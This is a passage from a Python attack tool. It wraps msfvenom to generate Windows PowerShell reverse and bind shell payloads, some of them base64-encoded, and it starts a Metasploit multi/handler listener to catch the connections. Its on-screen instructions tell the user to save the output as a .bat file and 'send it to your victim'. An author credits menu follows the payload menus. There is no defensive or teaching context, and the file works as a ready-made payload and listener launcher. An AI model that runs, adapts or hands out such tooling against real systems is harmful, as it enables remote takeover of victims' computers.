                        os.system("sudo msfvenom --platform windows -p windows/powershell_bind_tcp LHOST={0} LPORT={1} -f raw".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to start copying your output with\n" + begining.end)
                        print(begining.white + "     \t(powershell.exe) & ignore the symbols behinde & don't\n" + begining.end)
                        print(begining.white + "     \tforget to save your output as bat file .............\n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/powershell_bind_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()              
                elif pwin == "5":
                    bassem = str(input("[?] Do you wanna encode your payload with cmd/powershell_base64 Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p cmd/windows/reverse_powershell LHOST={0} LPORT={1} -f raw -e cmd/powershell_base64 -i 3".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to save your output as bat file\n" + begining.end)
                        print(begining.white + "     \tthen send it to your victim or run the powershell\n" + begining.end)
                        print(begining.white + "     \tcode in the \n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "cmd/windows/reverse_powershell"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p cmd/windows/reverse_powershell LHOST={0} LPORT={1} -f raw".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to save your output as bat file\n" + begining.end)
                        print(begining.white + "     \tthen send it to your victim or run the powershell\n" + begining.end)
                        print(begining.white + "     \tcode in the \n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "cmd/windows/reverse_powershell"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()        
                elif pwin == "6":
                    bassem = str(input("[?] Do you wanna encode your payload with cmd/powershell_base64 Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p cmd/windows/reverse_powershell LHOST={0} LPORT={1} -f raw -e cmd/powershell_base64 -i 3".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to save your output as bat file\n" + begining.end)
                        print(begining.white + "     \tthen send it to your victim or run the powershell\n" + begining.end)
                        print(begining.white + "     \tcode in the \n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "cmd/windows/reverse_powershell"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p cmd/windows/reverse_powershell LHOST={0} LPORT={1} -f raw".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to save your output as bat file\n" + begining.end)
                        print(begining.white + "     \tthen send it to your victim or run the powershell\n" + begining.end)
                        print(begining.white + "     \tcode in the \n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "cmd/windows/reverse_powershell"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()  
                elif pwin == "7":
                    bassem = str(input("[?] Do you wanna encode your payload with cmd/powershell_base64 Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p cmd/windows/powershell_bind_tcp LHOST={0} LPORT={1} -f raw -e cmd/powershell_base64 -i 3".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to save your output as bat file\n" + begining.end)
                        print(begining.white + "     \tthen send it to your victim or run the powershell\n" + begining.end)
                        print(begining.white + "     \tcode in the \n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "cmd/windows/powershell_bind_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p cmd/windows/powershell_bind_tcp LHOST={0} LPORT={1} -f raw".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        print(begining.red + "       [++]                                                            [++]" + begining.end)
                        print(begining.red + "\t\t\t         MUST README\n" + begining.end)
                        print(begining.white + "     \tPlease make sure to save your output as bat file\n" + begining.end)
                        print(begining.white + "     \tthen send it to your victim or run the powershell\n" + begining.end)
                        print(begining.white + "     \tcode in the \n" + begining.end)
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "cmd/windows/powershell_bind_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()        
 
 
        elif your_choice == "8":
            begining.os_clear()
            print('\33[8;38;98t')
            print("""
				 <| BLACK 15 |>

        FACEBOOK 	:->	www.facebook.com/unknownkid18
	YOUTUBE		:-> 	https://www.youtube.com/channel/UClF7WD_UzJ1kgC_RdznfQbQ
	GITHUB		:-> 	www.github.com/black15

				<| Dj3Bb1rAn0n |>

	FACEBOOK 	:->	    https://www.facebook.com/djebbar.bassem.16
	YOUTUBE		:-> 	https://www.youtube.com/channel/UClF7WD_UzJ1kgC_RdznfQbQ
	GITHUB		:-> 	https://github.com/DjebbarAnon

""")
            begining.ext()
        elif your_choice == "6":
            print(begining.green+"-"*33+"|"+begining.end)
            print(begining.green+"[!] Wait for next version please"+" |"+begining.end)
            print(begining.green+"-"*33+"|"+begining.end)
            begining.ext()
        elif your_choice == "7":
            print(begining.green+"-"*33+"|"+begining.end)
            print(begining.green+"[!] Wait for next version please"+" |"+begining.end)
            print(begining.green+"-"*33+"|"+begining.end)
            begining.ext()               
        elif your_choice == "9":
            print(begining.green+"-"*36+"|"+begining.end)
            print(begining.green+"[!] The new version not aviable yet"+" |"+begining.end)
            print(begining.green+"-"*36+"|"+begining.end)
            begining.ext()
        else:
            begining.ext()
work = work()      
begining = begining()   
def all_in_one():
    try:    
        begining.internet_checker()
        begining.os_clear()
        begining.services()
        begining.os_clear()
        begining.Linux()
        begining.Root()
        begining.Xterm()
        begining.MetaS()
        begining.menu()
        work.works()
    except KeyboardInterrupt:
       print("")
       begining.ExT()
	
if '__main__' == __name__:
	all_in_one()
	
	
	
	
	
	
	

